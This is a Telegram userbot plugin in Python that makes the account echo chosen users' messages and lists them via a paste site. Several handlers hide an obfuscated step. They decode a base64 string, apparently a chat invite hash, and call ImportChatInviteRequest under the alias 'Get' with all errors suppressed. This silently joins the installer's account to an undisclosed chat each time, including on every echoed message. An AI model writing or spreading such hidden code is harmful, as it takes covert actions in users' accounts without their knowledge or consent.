"""
created by @mrconfused and @sandy1709
Idea by @BlazingRobonix
fixed By Sh1vam
"""

import asyncio

import pybase64
import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from ub.events import *
from .. import CMD_HELP
from ub.utils import admin_cmd
from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
from ub import bot

@bot.on(admin_cmd(pattern="addecho$"))

async def echo(cat):
    if cat.fwd_from:
        return
    if cat.reply_to_msg_id is not None:
        reply_msg = await cat.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = cat.chat_id
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await cat.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await cat.edit("The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await cat.edit("Hello")
    else:
        await cat.edit("Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="rmecho$"))

async def echo(cat):
    if cat.fwd_from:
        return
    if cat.reply_to_msg_id is not None:
        reply_msg = await cat.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = cat.chat_id
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await cat.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await cat.edit("Echo has been stopped for the user")
        else:
            await cat.edit( "The user is not activated with echo")
    else:
        await cat.edit("Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))

async def echo(cat):
    if cat.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > 494:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"echo enabled users: [here]({url})"
        await cat.edit(reply_text)
    else:
        await cat.edit(output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(cat):
    #if cat.chat_id in Config.UB_BLACK_LIST_CHAT:
    #   return
    if is_echo(cat.sender_id, cat.chat_id):
        await asyncio.sleep(2)
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await cat.client(hmm)
        except BaseException:
            pass
        if cat.message.text or cat.message.sticker:
            await cat.reply(cat.message)


CMD_HELP.update(
    {
        "echo": "**Syntax :** `.addecho` reply to user to whom you want to enable\
    \n**Usage : **replays his every message for whom you enabled echo\
    \n\n**Syntax : **`.rmecho` reply to user to whom you want to stop\
    \n**Usage : **Stops replaying his messages\
    \n\n**Syntax : **`.listecho`\
    \n**Usage : **shows the list of users for whom you enabled echo\
    "
    }
)
